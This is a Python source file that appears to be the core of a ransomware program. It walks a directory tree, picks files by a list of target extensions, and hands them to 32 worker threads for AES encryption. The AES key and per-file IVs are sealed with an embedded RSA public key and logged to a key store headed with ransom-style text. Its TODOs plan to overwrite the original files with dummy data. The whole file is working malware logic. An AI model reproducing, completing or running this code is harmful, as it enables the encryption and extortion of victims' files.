import os
import sys
import base64
from queue import Queue


import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
from RSACipher import RSACipher
from aptal import APTAl

def isInTargetFiles(_extention):
    """
        Binary Search to find extentions in the target files
    """
    left = 0
    right = len(Utils.file_extentions) - 1

    while left <= right:
        mid = (left + right)// 2
        current = Utils.file_extentions[mid]
        if current  > _extention:
            right = mid - 1
        elif current  < _extention:
            left = mid + 1
        else:
            return True
    return False

def isValidFile(file_path):
    """
        Determining whether the file is valid or not
    """
    if file_path != Utils.what_is_my_name:
        _extention = file_path.split(".")[-1].lower()
        if len(_extention) == 1 or isInTargetFiles(_extention):
            return True
    return False

def findFiles(path):
    """
        Recon
    """

    rsa_cipher = RSACipher(Utils.rsa_public_key)

    goodbye_files = Queue()
    aeskey = AESCipher.generate_key(Utils.aes_IV_key_length)
    
    for i in range(32):
        worker = APTAl(i, goodbye_files, aeskey)
        worker.daemon = True
        worker.start()

    with open(Utils.aesIV_file_store_path,"ab") as key_storing_file:
        key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
        #key_storing_file.write(b"BEGIN AES KEY:\n"+aeskey + b"\nEND AES KEY\n")
        for directory_path, directories, files in os.walk(path):
            for fiile in files:
                if isValidFile(fiile):
                    iv = AESCipher.generate_key(Utils.aes_IV_key_length)
                    fp = os.path.join(directory_path,fiile)
                    goodbye_files.put((iv, fp))
                    iv = rsa_cipher.encrypt(iv)
                    iv = base64.b64encode(iv)
                    fp = rsa_cipher.encrypt(fp.encode("utf-8"))
                    fp = base64.b64encode(fp)
                    key_storing_file.write(iv + b":::::" + fp + b"\n")

    goodbye_files.join()

    print("FILE ENCRYPTION HAS JUST DONE")

def keyStoreCreate():

    with open(Utils.aesIV_file_store_path,"w") as key_storing_file:
        key_storing_file.write(Utils.who_we_are)
        key_storing_file.write(Utils.what_is_my_purpose)
        # and so on
    print("STORE FILE CREATED")

def main():
    """
    TODO:1 Multithread -> File Explorer and Encryption
    TODO:2
        re-write file with dummy data
        del <object>
        garbage collection
    """
    keyStoreCreate()
    found_files = findFiles(Utils.root_directory)

    

if __name__ == "__main__":
    main()